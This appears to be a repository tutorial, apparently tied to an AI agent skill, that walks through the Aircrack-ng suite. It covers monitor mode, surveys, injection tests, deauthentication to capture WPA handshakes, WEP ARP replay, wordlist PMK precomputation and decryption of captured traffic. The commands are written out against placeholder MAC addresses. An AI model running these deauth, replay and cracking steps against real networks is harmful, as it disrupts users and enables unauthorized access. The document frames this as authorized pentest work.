# Aircrack-ng Zero to Hero

From first monitor-mode capture to coordinated WPA/WEP workflows using the [Aircrack-ng](https://www.aircrack-ng.org/) suite.

> **Authorization:** Intercepting or disrupting wireless networks without permission is illegal in most jurisdictions. Use only on your own lab hardware, with written pentest scope, or on explicitly authorized SSIDs/BSSIDs.
>
> **Hardware:** You need a **WiFi adapter that supports monitor mode and packet injection**. Many built-in laptop cards do not.
>
> **This repo (2026-08-10):** Windows suite **1.7** under `.tools/aircrack-ng/aircrack-ng-1.7-win/`. Captured help in `.tmp_aircrack_help/`. **`airmon-ng` is not in the Windows zip** (Linux/WSL). **`aircrack-ng` cracker help failed on this host** (`The system cannot execute the specified program`) — re-capture on Linux; **do not invent cracker flags**.

---

## 1. What the suite does

| Tool | Role | This host |
|------|------|-----------|
| `airmon-ng` | Enable/disable monitor mode | **Linux/WSL only** |
| `airodump-ng` | Discover APs/clients; write PCAP/CSV | Help captured |
| `aireplay-ng` | Inject frames (deauth, ARP replay, fake auth) | Help captured |
| `aircrack-ng` | Crack WEP/WPA-PSK from captures | **Help not captured** — use Linux |
| `airdecap-ng` | Decrypt PCAP with known key | Help captured |
| `airolib-ng` | Precompute WPA PMKs | Help captured |
| `airbase-ng` | Software AP (lab) | Help captured |
| `packetforge-ng` / `wpaclean` / … | Forge/clean helpers | Help captured |

Full Captured help: [Aircrack-Ng-CLI-Options.md](Aircrack-Ng-CLI-Options.md).

---

## 2. Install

### Linux / Kali / Debian (preferred for RF work)

```bash
sudo apt update
sudo apt install aircrack-ng
aircrack-ng --help   # re-capture for SpiderFeet docs when available
```

### Windows (this repo extract)

Binaries: `.tools/aircrack-ng/aircrack-ng-1.7-win/bin`. Useful for offline help / some utilities. **Monitor mode + cracker workflow still needs Linux/WSL + adapter.**

---

## 3. First passive survey (15 minutes, Linux)

```bash
# 1. Identify wireless interface
iw dev

# 2. Free the radio
sudo airmon-ng check kill

# 3. Monitor mode
sudo airmon-ng start wlan0
# note name: wlan0mon

# 4. Scan everything
sudo airodump-ng wlan0mon

# 5. Save for parsing (captured flags)
sudo airodump-ng -w mysurvey --output-format csv,pcap wlan0mon
# Ctrl+C after a few minutes

# 6. Cleanup
sudo airmon-ng stop wlan0mon
```

Open `mysurvey-01.csv` — AP table at top, stations below.

---

## 4. Understand the CSV

**Access points:** BSSID, channel, `Privacy` (OPN/WEP/WPA/WPA2), ESSID  
**Stations:** client MAC, associated BSSID, probed network names

Parse with TextFSM → SpiderFeet `WIFI_ACCESS_POINT` nuggets. See `.cursor/skills/aircrack-ng/references/output-and-parsing.md`.

---

## 5. Injection test

Before any active attack:

```bash
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0mon
# short form: aireplay-ng -9 wlan0mon
```

Expect injection success messaging. If not, change adapter/driver.

---

## 6. WPA handshake workflow

**Goal:** Capture 4-way handshake for offline password guess.

```bash
# Terminal 1 — lock channel and AP (captured airodump flags)
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF -w wpa wlan0mon

# Terminal 2 — only if authorized and client is associated
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

When airodump shows `WPA handshake: AA:BB:CC:DD:EE:FF`:

```bash
wpaclean clean.cap wpa-01.cap
# Crack on Linux using flags from: aircrack-ng --help
# (do not invent -w / -b / other switches from memory in formal docs)
```

Tutorial: https://www.aircrack-ng.org/doku.php?id=wpa_capture

---

## 7. WEP workflow (legacy lab)

```bash
sudo airodump-ng --channel 1 --bssid AP_MAC -w wep wlan0mon
sudo aireplay-ng --arpreplay -b AP_MAC -h CLIENT_MAC wlan0mon
# Crack on Linux after aircrack-ng --help re-capture
```

Flowchart: https://www.aircrack-ng.org/doku.php?id=flowchart

---

## 8. airolib-ng for big wordlists

```bash
airolib-ng pmk_db --import essid /tmp/essid.txt
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng pmk_db --clean all
airolib-ng pmk_db --batch
# Final crack: Linux aircrack-ng (help-gated flags)
```

---

## 9. Decrypt traffic after crack

```bash
airdecap-ng -e "NetworkName" -p "recoveredpassword" wpa-01.cap
```

Analyze `wpa-01-dec.cap` in Wireshark (authorized scope).

---

## 10. Orchestrated module map

```
airmon-ng (Linux monitor on)
    → airodump-ng (discover / capture)
        → aireplay-ng (optional injection)
            → wpaclean / airolib-ng (optional prep)
                → aircrack-ng (Linux offline crack — help-gated)
                    → airdecap-ng (decrypt PCAP)
```

Passive OSINT stops after **airodump-ng + CSV parse**.

Full workflows: `.cursor/skills/aircrack-ng/references/workflows.md`

---

## 11. Tactics when things fail

| Problem | Try |
|---------|-----|
| No APs | Monitor mode? Antenna? Region settings? |
| No handshake | Associated client? Minimal `--deauth`? `wpaclean`? |
| IVs stuck (WEP) | Re-auth, different attack mode, `--test` |
| Interface drops | `airmon-ng stop/start`, USB power save off |
| Windows-only host | Move to Linux/WSL; don't invent cracker flags |

`.cursor/skills/aircrack-ng/references/tactics.md`

---

## 12. SpiderFeet integration (planned)

- Discovery maps to `WIFI_ACCESS_POINT` per BSSID
- Use TextFSM on airodump CSV
- Default: **no injection** in OSINT mode
- Nugget mapping: `.cursor/skills/aircrack-ng/references/nugget-mapping.md`

---

## 13. Next steps

- Agent skill: `.cursor/skills/aircrack-ng/SKILL.md`
- CLI reference (Captured help **2026-08-10**): [Aircrack-Ng-CLI-Options.md](Aircrack-Ng-CLI-Options.md)
- Sources: `.cursor/skills/aircrack-ng/references/sources.md`
